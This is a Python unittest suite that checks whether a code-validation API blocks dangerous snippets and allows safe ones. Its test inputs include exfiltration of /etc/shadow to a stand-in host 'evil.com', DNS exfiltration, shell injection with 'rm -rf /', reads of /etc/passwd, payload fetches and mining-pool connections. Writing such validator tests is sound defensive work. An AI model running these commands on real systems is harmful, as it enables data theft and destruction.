import unittest
from puripy import FastSecurityAPI, ValidationResult
from typing import Dict

class SecurityTestSuite(unittest.TestCase):
    def setUp(self):
        self.api = FastSecurityAPI()

    def _validate_and_check(self, code: str, expected_result: ValidationResult):
        result = self.api.validate_code(code)
        if expected_result == ValidationResult.ALLOWED:
            print('result', result)
        self.assertEqual(result.result, expected_result)
        return result

    def test_syntax_errors(self):
        """Test various syntax errors."""
        # Missing parenthesis
        code1 = """
def broken_function:
    print("Hello"
        """
        self._validate_and_check(code1, ValidationResult.SYNTAX_ERROR)

        # Invalid indentation
        code2 = """
def test():
print("bad indent")
        """
        self._validate_and_check(code2, ValidationResult.SYNTAX_ERROR)

        # Invalid Python syntax
        code3 = """
if True print("invalid")
        """
        self._validate_and_check(code3, ValidationResult.SYNTAX_ERROR)

    def test_dangerous_imports(self):
        """Test blocked and dangerous imports."""
        # Direct dangerous import
        code1 = """
import subprocess
import os
        """
        self._validate_and_check(code1, ValidationResult.BLOCKED)

        # Indirect dangerous import
        code2 = """
from os import system
        """
        self._validate_and_check(code2, ValidationResult.BLOCKED)

        # Low-level system access
        code3 = """
import ctypes
import cffi
        """
        self._validate_and_check(code3, ValidationResult.BLOCKED)

    def test_command_execution(self):
        """Test command execution attempts."""
        # Direct command execution
        code1 = """
import os
os.system('ls -la')
        """
        self._validate_and_check(code1, ValidationResult.BLOCKED)

        # Subprocess execution
        code2 = """
import subprocess
subprocess.run(['cat', '/etc/passwd'])
        """
        self._validate_and_check(code2, ValidationResult.BLOCKED)

        # Shell injection attempt
        code3 = """
user_input = '; rm -rf /'
os.system(f'echo {user_input}')
        """
        self._validate_and_check(code3, ValidationResult.BLOCKED)

    def test_file_operations(self):
        """Test dangerous file operations."""
        # File deletion attempt
        code1 = """
import os
os.remove('/important/file')
        """
        self._validate_and_check(code1, ValidationResult.BLOCKED)

        # Directory traversal
        code2 = """
with open('../../../etc/passwd', 'r') as f:
    data = f.read()
        """
        self._validate_and_check(code2, ValidationResult.BLOCKED)

        # File permission modification
        code3 = """
import os
os.chmod('/etc/shadow', 0o777)
        """
        self._validate_and_check(code3, ValidationResult.BLOCKED)

    def test_network_attacks(self):
        """Test network-related attacks."""
        # Direct socket connection
        code1 = """
import socket
s = socket.socket()
s.connect(('evil.com', 80))
        """
        self._validate_and_check(code1, ValidationResult.BLOCKED)

        # HTTP request to suspicious domain
        code2 = """
import requests
requests.get('http://cryptominer.com/payload')
        """
        self._validate_and_check(code2, ValidationResult.BLOCKED)

        # DNS tunneling attempt
        code3 = """
import dns.resolver
dns.resolver.query('data.exfil.evil.com', 'TXT')
        """
        self._validate_and_check(code3, ValidationResult.BLOCKED)

    def test_crypto_mining(self):
        """Test cryptocurrency mining attempts."""
        # Direct mining code
        code1 = """
import hashlib
def mine_bitcoin():
    while True:
        hashlib.sha256(b'mining').hexdigest()
        """
        self._validate_and_check(code1, ValidationResult.BLOCKED)

        # Mining pool connection
        code2 = """
import socket
s = socket.socket()
s.connect(('mining-pool.com', 3333))
        """
        self._validate_and_check(code2, ValidationResult.BLOCKED)

        # Suspicious mining-related strings
        code3 = """
WALLET_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
MINING_POOL = "stratum+tcp://pool.com:3333"
        """
        self._validate_and_check(code3, ValidationResult.BLOCKED)

    def test_data_exfiltration(self):
        """Test data exfiltration attempts."""
        # Direct file exfiltration
        code1 = """
import requests
with open('/etc/shadow', 'r') as f:
    requests.post('http://evil.com/data', data=f.read())
        """
        self._validate_and_check(code1, ValidationResult.BLOCKED)

        # DNS exfiltration
        code2 = """
import socket
def exfil(data):
    socket.gethostbyname(f'{data}.evil.com')
        """
        self._validate_and_check(code2, ValidationResult.BLOCKED)

        # Steganography attempt
        code3 = """
from PIL import Image
def hide_data(image, data):
    # Hide sensitive data in image
    pass
        """
        self._validate_and_check(code3, ValidationResult.BLOCKED)

    def test_code_quality(self):
        """Test code quality and style issues."""
        # Unused imports
        code1 = """
import sys
import os
def test():
    pass
        """
        result1 = self.api.validate_code(code1)
        self.assertIsNotNone(result1.details)

        # Variable naming
        code2 = """
x = 1
y = 2
z = x + y
        """
        result2 = self.api.validate_code(code2)
        self.assertIsNotNone(result2.details)

    def test_safe_code(self):
        """Test legitimate code that should be allowed."""
        # Basic calculation
        code1 = """
def calculate_average(numbers):
    return sum(numbers) / len(numbers)
        """
        self._validate_and_check(code1, ValidationResult.ALLOWED)
        # String manipulation
        code2 = """
def process_text(text):
    words = text.split()
    return ' '.join(word.capitalize() for word in words)
        """
        self._validate_and_check(code2, ValidationResult.ALLOWED)
        # Data processing
        code3 = """
import pandas as pd
def analyze_data(df):
    return df.describe()
        """
        self._validate_and_check(code3, ValidationResult.ALLOWED)

    def test_resource_abuse(self):
        """Test attempts to abuse system resources."""
        # Infinite loop
        code1 = """
while True:
    pass
        """
        self._validate_and_check(code1, ValidationResult.BLOCKED)

        # Memory exhaustion
        code2 = """
data = []
while True:
    data.extend([1] * 1000000)
        """
        self._validate_and_check(code2, ValidationResult.BLOCKED)

        # CPU abuse
        code3 = """
def waste_cpu():
    while True:
        [x**2 for x in range(1000000)]
        """
        self._validate_and_check(code3, ValidationResult.BLOCKED)

if __name__ == '__main__':
    unittest.main(verbosity=2)